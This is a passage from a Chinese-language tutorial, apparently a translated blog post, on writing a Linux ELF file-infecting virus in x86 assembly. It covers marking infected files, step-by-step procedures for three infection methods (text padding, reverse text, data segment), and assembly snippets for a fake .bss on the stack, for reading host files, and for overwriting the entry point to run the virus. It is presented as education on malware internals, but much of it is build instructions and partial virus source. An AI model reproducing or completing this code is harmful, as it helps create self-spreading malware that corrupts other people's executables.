&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;2.6.4);&nbsp;offset&nbsp;is&nbsp;(d_reclen&nbsp;-&nbsp;1)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
struct&nbsp;linux_dirent64&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ino64_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d_ino;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;64位inode&nbsp;number&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;off64_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d_off;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;64位下个structure的偏移&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;short&nbsp;d_reclen;&nbsp;/*&nbsp;这个dirent的长度&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;char&nbsp;&nbsp;d_type;&nbsp;&nbsp;&nbsp;/*&nbsp;文件类型&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d_name[];&nbsp;/*文件名&nbsp;（null结尾）&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;};</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">但我正在使用的是我发现的一种模式，它没有使用到结构体中的偏移量。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">下一步是检查文件，看看是否：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(255, 0, 0);">——这是一个ELF可执行文件</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(255, 0, 0);">——它是不是已经被感染</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">早些时候，我介绍了一些关于不同操作系统使用的不同类型的可执行文件。这些文件类型在其文件头部都有不同的标志。例如，ELF文件总是从7f45 4c46开始。45-4c-46是ASCII字母E-L-F的十六进制表示。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果你转储windows可执行文件十六进制数据，你会看到它开头是4D5A，代表字母M-Z。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">十六进制转储OSX可执行文件显示了标记字节CEFA EDFE，也是小端的“FEED FACE”。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">你可以在这里看到更多关于可执行文件格式和各自的标记：<a href="https://en.wikipedia.org/wiki/List_of_file_signatures" _src="https://en.wikipedia.org/wiki/List_of_file_signatures">https://en.wikipedia.org/wiki/List_of_file_signatures</a></span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t01812725f7e467c4bc.png" title="t0160f362eef743325e.png" alt="http://p6.qhimg.com/t0160f362eef743325e.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在我的病毒中，我要把自己的标记写在了ELF文件头中第9 - 12字节里未使用的地方。这是一个不错的位置，可以用来存放一个双字“0edd1e00”——我的名字。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我需要这个来标记我已经感染的文件，这样我就不会再次感染已经感染过的文件。不然受感染文件的长度将像雪球一样越滚越大，耶路撒冷病毒第一次就因此被检测到。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">通过简单读取前12个字节，我们可以确定该文件是否是一个好的感染对象然后再继续下一个目标。我打算将每一个潜在的目标存储在一个单独的缓冲区，称之为“目标”。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在它开始要变得困难了。为了感染ELF文件，你需要了解一切关于ELF文件结构的知识。这里是一个很好的学习起点：<a href="http://www.skyfree.org/linux/references/ELF_Format.pdf" _src="http://www.skyfree.org/linux/references/ELF_Format.pdf">http://www.skyfree.org/linux/references/ELF_Format.pdf</a></span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">不同于简单的COM文件，ELF存在一些不同的挑战问题。简单来说，ELF文件包括：ELF头，程序头，节头，和指令操作码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">ELF头告诉我们关于程序头和节头的信息。它也告诉我们程序在内存中的入口点位置（首先执行的指令操作码）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">程序头告诉我们，哪个“段”属于TEXT段，哪个“段”属于DATA段，也给出其在文件中的偏移。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">节头给出每个“节”和它们所属“段”的信息。这可能有点令人困惑。首先要明白的是一个可执行文件在磁盘上和它运行在内存中是不同的状态，而这些头给出了这两方面的相关信息。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">TEXT段是可读取/执行的代码段，它包含了我们的代码和其他只读数据。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">DATA段是可读/写的数据段，它包含了全局变量和动态链接的信息。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在TEXT段，有一个.text节和一个.rodata节。在DATA段中，有一个.data节和.bss节。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果你熟悉汇编语言，这些节名应该对你来说听起来很熟悉。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">.text是代码驻留的地方，.data是存储初始化全局变量的地方。.bss包含未初始化的全局变量，因为它是未初始化的，所以没有占用磁盘空间。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">不像PE文件（微软的），ELF文件没有太多可以感染的区域。老式的DOS、COM文件几乎允许你在任何地方添加病毒代码，然后在100 h这个地址覆盖内存代码（因为COM文件总是在100 h的内存地址开始映射）。ELF文件不允许你写TEXT段。下面这些是ELF感染病毒的主要方法：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">感染Text段填充区</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">感染.text节的尾部。我们可以利用ELF文件的特点，当其加载到内存中，尾部会被使用‘0’来填充成一个完整的内存页。受到内存页长度的限制，所以我们只能在32位系统上容纳一个4 kb病毒或在64位系统容纳2 mb病毒。这看起来可能很小，但也足够容纳用C或者汇编语言编写的小病毒。这一目标的实现方法是：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——修改入口点（ELF头）到.text节的尾部</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——增加节表（ELF头）里对应节的页长度</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——增加Text段的文件长度和内存长度为病毒代码的长度</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——遍历每个被病毒寄生后的程序头，根据页面长度增加对应的偏移</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——找到Text段的最后一个节头，增加其节长度（在节头里）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——遍历每个被病毒感染后的节头，根据页面长度增加对应的偏移</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——在.text节的尾部插入实际的病毒代码</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——插入病毒代码后跳转到原始宿主的入口点执行</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">反向感染Text段</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在允许宿主代码保持相同虚拟地址的同时感染.text节区的前面部分。我们将反向扩展text段。在现代Linux系统中允许的最小虚拟映射地址是0x1000，这便是我们可以反向拓展text段的限制长度。在64位系统上，默认的text段虚拟地址通常是0x400000，这就有可能给病毒留下减掉ELF头长度后的大小为0x3ff000的空间。在32位系统上，默认的text段虚拟地址通常是0x0804800，这就有可能产生更大的病毒。这一目标的实现方式是：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——增加节表（在ELF头）里的偏移为病毒长度（对下一内存页对齐值取余）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——在Text段程序头里，根据病毒的长度（对下一内存页对齐值取余）减小虚拟地址（和物理地址）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——在Text段程序头里，根据病毒的长度（对下一内存页对齐值取余）增加文件长度和内存长度</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——根据病毒的长度（再次取余），遍历每个程序头的偏移，增加它的值到大于text段&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——修改入口点（在ELF头）到原始的text段虚拟地址——病毒的长度（再次取余）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——根据病毒的长度（再次取余），增加程序头偏移（在ELF头）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——插入病毒实体到text段的开始位置</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Data段感染</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">感染数据段。我们将把病毒代码附加到data段（在.bss节之前）。因为它是数据部分，我们的病毒代码可以尽可能的大，像我们希望的那样不受约束。Data内存段的数据有一个R + W（读和写）的权限设置，而Text内存段有R + X（读和执行）权限设置。在没有NX位设置的系统（如32位Linux系统）中，你可以执行Data段里的代码而不用改变权限设置。然而，其他系统需要你在病毒寄存的内存段属性中添加一个可执行的标志。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——根据病毒的长度增加节头的偏移（在ELF头）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——修改入口点（在ELF头）指向数据段的尾部（虚拟地址+文件长度）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——在数据段程序头里，根据病毒长度增加页面和内存的长度</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——根据病毒的长度增加.bss节的偏移（在节头）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——设置数据段的可执行权限位（32位Linux系统不适用）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——插入病毒实体到数据段的尾部</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——插入代码，跳转到原始宿主的入口点</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">当然，还有更多感染的方法，但这些是首要选择。对于我们的示例，将使用上面的第三个方法。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">编写病毒时还有另外一个比较大的障碍——变量。理想情况下，我们不希望合并（病毒和宿主）.data节和.bss节。此外，一旦你汇编或编译病毒，无法保证当病毒在宿主程序运行时你的变量始终在同一个虚拟地址。事实上，这几乎是不会发生的事情，那样的话宿主程序将会抛出段错误的提示。所以在理想情况下，你希望限制你的病毒到一个特定的节：.text。如果你有汇编的经验，你就明白这是一项挑战。我将和你们分享一些技巧，应该就会使这个过程更容易些。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先，让我们关照一下.data节变量（初始化了）。如果可能的话，“硬编码”这些值。或者，假设我有我.asm代码：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">section&nbsp;.data
&nbsp;&nbsp;&nbsp;&nbsp;folder&nbsp;db&nbsp;&quot;.&quot;,&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;len&nbsp;equ&nbsp;2048
&nbsp;&nbsp;&nbsp;&nbsp;filenamelen&nbsp;equ&nbsp;32
&nbsp;&nbsp;&nbsp;&nbsp;elfheader&nbsp;dd&nbsp;0x464c457f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;0x7f454c46&nbsp;-&gt;&nbsp;.ELF&nbsp;（反转字节序）
&nbsp;&nbsp;&nbsp;&nbsp;signature&nbsp;dd&nbsp;0x001edd0e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;0x0edd1e00&nbsp;反转字节序后的签名
section&nbsp;.bss
&nbsp;&nbsp;&nbsp;&nbsp;filename:&nbsp;resb&nbsp;filenamelen&nbsp;&nbsp;;&nbsp;目标文件路径
&nbsp;&nbsp;&nbsp;&nbsp;buffer:&nbsp;resb&nbsp;len&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;所有的文件名
&nbsp;&nbsp;&nbsp;&nbsp;targets:&nbsp;resb&nbsp;len&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;目标文件名
&nbsp;&nbsp;&nbsp;&nbsp;targetfile:&nbsp;resb&nbsp;len&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;目标文件内容
section&nbsp;.text
&nbsp;&nbsp;&nbsp;&nbsp;global&nbsp;v1_start
v1_start:
你可以这样做：
&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;signature
&nbsp;&nbsp;&nbsp;&nbsp;dd&nbsp;0x001edd0e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;0x0edd1e00反转字节序后的签名
signature:
&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;现在值存在ecx里了</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们利用的是，当一个call指令被调用时，调用的当前指令的绝对地址将会被压入栈内存里以期能够正常返回。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这样我们就可以遍历每个.data节里的变量然后一起解决这个问题了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">至于.bss节里的变量（未初始化的），我们需要储备一定数量的字节数据。我们在.text节里这样做因为它属于Text代码段，其属性被标记为r + x（读取和执行），不允许在该内存段里写数据。所以我决定使用堆栈。栈？是的，一旦我们把字节压入堆栈，我们可以看到堆栈指针并保存这些标记。这里是我解决方案里的一个例子：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">&nbsp;;&nbsp;给未初始化的变量开辟栈内存空间以避免使用.bss节
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;ecx,&nbsp;2328&nbsp;&nbsp;&nbsp;;&nbsp;设置循环计数2328&nbsp;（x4=9312&nbsp;bytes）.&nbsp;filename（esp），&nbsp;buffer&nbsp;（esp+32），&nbsp;targets&nbsp;（esp+1056），&nbsp;targetfile&nbsp;（esp+2080）
loop_bss:
&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;0x00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;压入4个字节（双字）的0
&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;ecx,&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;计数减一
&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;ecx,&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;jbe&nbsp;loop_bss
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;edi,&nbsp;esp&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;esp&nbsp;有了我们要伪造的&nbsp;.bss&nbsp;偏移。&nbsp;让我们将它存储在edi里。</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">注意到我一直在压入0x00字节（在32位汇编压栈一次将一个双字压入，正好是寄存器的长度）。确切地说，我们共压入2328次。这样大概给我们开辟一个大约9312字节的空间可以使用。一旦我完成所有的0字节压栈，把ESP的值（即我们的堆栈指针）存储起来，并把它作为我们“伪造.bss”的基址。我可以引用ESP +[offset]来访问不同的变量。在我的例子中，我保存的[esp]对应filename，[esp + 32]对应buffer，[esp + 1056]对应targets，以及[esp + 2080]对应targetfile。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在我就可以完全去除.data节和.bss节的使用了，并且整个病毒被唯一的一个.text节来承载！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">readelf是一个很有用的工具。运行readelf –a[file]将会给你ELF头/程序头/节头的一些细节：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里有三个节：.text、.data、.bss</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t014d7de24f9dfa9928.png" title="t01c394796d614b966b.png" alt="http://p5.qhimg.com/t01c394796d614b966b.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里我们消除了.bss节：</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t010da000b27c1d2b12.png" title="t0172065179330a7a6b.png" alt="http://p3.qhimg.com/t0172065179330a7a6b.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在这里，我们已经完全消除了.data段。我们可以用.text节来单独进行一切操作！</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t01ebed7922d391e983.png" title="t01d1e4195dee2d76dc.png" alt="http://p5.qhimg.com/t01d1e4195dee2d76dc.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在我们将需要读取宿主文件的字节数据到一个缓冲区，对头部进行必要的修改，并注入病毒标记。如果你做了给你的关于目录条目结构和保存目标文件长度的家庭作业，将对你有好处。否则，我们将不得不一个字节一个字节地读文件，直到系统读到一个在EAX返回0 x00的调用，说明我们已经达到了EOF：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">reading_loop:
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;eax,&nbsp;3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;sys_read
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;edx,&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;一次读一个字节&nbsp;（yeah，&nbsp;我知道这可能是最好的）
&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;80h&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;eax,&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;如果返回&nbsp;0，我们读到了EOF
&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp;reading_eof
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;eax,&nbsp;edi&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;eax,&nbsp;9312&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;2080&nbsp;+&nbsp;7232&nbsp;（2080&nbsp;targetfile在我们伪造&nbsp;.bss的偏移）
&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;ecx,&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;如果文件超过&nbsp;7232&nbsp;字节，&nbsp;退出
&nbsp;&nbsp;&nbsp;&nbsp;jge&nbsp;infect
&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;ecx,&nbsp;1
&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;reading_loop
reading_eof:
&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;保存最后读取的一个字节的地址，&nbsp;我们后面需要用到它
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;eax,&nbsp;6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;关闭文件
&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;80h</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">修改缓冲区是非常简单的。记住，当移动任何超出一个字节时你必需得处理反向字节顺序（小端）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里我们注入病毒标记并改变入口点指向我们在数据段尾部的病毒代码。（文件长度不包括的.bss在内存中占据的空间）：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">mov&nbsp;ebx,&nbsp;dword&nbsp;[edi+2080+eax+8]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;phdr-&gt;vaddr&nbsp;（内存虚拟地址）
add&nbsp;ebx,&nbsp;edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;新入口点&nbsp;=&nbsp;phdr[data]-&gt;vaddr&nbsp;+&nbsp;p[data]-&gt;filesz
mov&nbsp;ecx,&nbsp;0x001edd0e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;在8字节处插入我们的标志（ELF头没有用到的节）
mov&nbsp;[edi+2080+8],&nbsp;ecx
mov&nbsp;[edi+2080+24],&nbsp;ebx&nbsp;&nbsp;;&nbsp;用病毒覆盖旧入口点&nbsp;（在buffer里）</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">注意到我想存储0xedd1e00（用十六进制字符编写的我的名字）的病毒标记，但反向字节顺序给了我们0x001edd0e。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">你还会注意到，我用偏移算法找到通向我留给未初始化变量的栈底部区域。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在我们需要定位DATA程序头并做一些修改。诀窍是先找到PT_LOAD类型，然后确定其偏移是不是非0。如果其偏移量为0，它就是一个TEXT程序头。否则，它就是DATA。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><p><code><span style="font-size:13px"></span></code></p><pre class="brush:plain;toolbar:false">section_header_loop：
&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;循环通过节头来寻找.bss节（NOBITS）
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;;0&nbsp;&nbsp;sh_name&nbsp;包含一个指向给定节的名字字符串指针
&nbsp;&nbsp;&nbsp;&nbsp;;+4&nbsp;sh_type&nbsp;给定节类型&nbsp;[节的名称
&nbsp;&nbsp;&nbsp;&nbsp;;+8&nbsp;sh_flags&nbsp;&nbsp;&nbsp;&nbsp;其他标志&nbsp;...
&nbsp;&nbsp;&nbsp;&nbsp;;+c&nbsp;sh_addr&nbsp;运行时节到虚拟地址
&nbsp;&nbsp;&nbsp;&nbsp;;+10&nbsp;&nbsp;&nbsp;&nbsp;sh_offset&nbsp;&nbsp;&nbsp;节在文件中到偏移
&nbsp;&nbsp;&nbsp;&nbsp;;+14&nbsp;&nbsp;&nbsp;&nbsp;sh_size&nbsp;zara&nbsp;white&nbsp;phone&nbsp;numba
&nbsp;&nbsp;&nbsp;&nbsp;;+18&nbsp;&nbsp;&nbsp;&nbsp;sh_link根据节类型
&nbsp;&nbsp;&nbsp;&nbsp;;+1c&nbsp;&nbsp;&nbsp;&nbsp;sh_info&nbsp;根据节类型
&nbsp;&nbsp;&nbsp;&nbsp;;+20&nbsp;&nbsp;&nbsp;&nbsp;sh_addralign&nbsp;&nbsp;&nbsp;&nbsp;对齐
&nbsp;&nbsp;&nbsp;&nbsp;;+24&nbsp;&nbsp;&nbsp;&nbsp;sh_entsize&nbsp;&nbsp;当节包含固定长度的入口时被使用
&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;ax，&nbsp;word&nbsp;[edi+2080+46]
&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;ecx，&nbsp;0
